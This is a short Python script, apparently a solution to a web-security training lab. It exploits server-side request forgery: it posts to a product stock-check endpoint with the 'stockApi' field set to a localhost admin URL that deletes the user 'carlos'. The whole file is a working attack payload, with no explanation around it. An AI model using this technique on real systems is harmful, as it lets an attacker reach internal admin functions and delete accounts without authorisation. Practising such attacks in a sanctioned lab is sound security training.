import requests
stock_url = 'https://ac031f091f89108f80b24b0f003500f0.web-security-academy.net/product/stock'

stock_api_data = {
    'stockApi': 'http://localhost/admin/delete?username=carlos'
}
resp = requests.post(stock_url, stock_api_data)
print(resp.text)

